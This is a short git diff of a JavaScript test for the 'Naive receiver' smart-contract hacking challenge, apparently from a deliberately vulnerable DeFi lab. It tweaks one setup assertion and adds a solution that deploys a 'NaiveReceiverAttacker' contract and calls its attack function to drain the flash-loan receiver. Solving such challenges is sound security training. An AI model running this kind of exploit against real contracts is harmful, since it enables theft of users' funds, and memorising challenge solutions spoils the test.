@@ -29,7 +29,7 @@ describe('[Challenge] Naive receiver', function () {
         receiver = await FlashLoanReceiverFactory.deploy(pool.address);
         await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
         await expect(
-            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
+            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER - 2n*10n**18n, 10n**18n, "0x")
         ).to.be.reverted;
         expect(
             await ethers.provider.getBalance(receiver.address)
@@ -38,6 +38,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('NaiveReceiverAttacker', player)).deploy(
+            pool.address,
+            receiver.address
+        );
+        
+        await attacker.connect(user).attack();
     });
 
     after(async function () {
